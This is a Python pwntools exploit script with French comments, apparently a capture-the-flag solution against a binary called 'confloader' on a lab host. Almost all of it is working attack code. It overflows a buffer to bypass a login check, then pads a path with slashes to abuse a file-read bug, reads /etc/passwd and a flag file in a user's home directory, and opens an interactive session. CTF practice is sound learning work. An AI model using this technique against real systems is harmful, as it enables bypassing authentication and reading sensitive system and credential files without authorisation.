#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./confloader')

host = args.HOST or '10.22.6.20'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *login+253
b *login+335
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b'Done !\n')

# Bypass de la fonction check
p = p64(0xc0febabe) # input buffer de 8 octets
p += p64(0xc0febabe) # overflow du check buffer
io.sendlineafter(b'code:  \n',p)

# Exploit de la vuln dans read_config
io.sendlineafter(b'>>>',b'4')
filename = b'passwd'
p = b'/etc/' 
# On ajoute autant de '/' pour remplir le buffer
p += b'/' * (0x40-len(filename)-len(p)) + filename
io.sendafter(b'File path:', p)

# On affiche illégalement le contenu d fichier
io.sendlineafter(b'>>>',b'3')

# Exploit de la vuln dans read_config
io.sendlineafter(b'>>>',b'4')
filename = b'flag'
p = b'/home/ghoztadm' 
# On ajoute autant de '/' pour remplir le buffer
p += b'/' * (0x40-len(filename)-len(p)) + filename
io.sendafter(b'File path:', p)

# On affiche illégalement le contenu du fichier
io.sendlineafter(b'>>>',b'3')

io.interactive()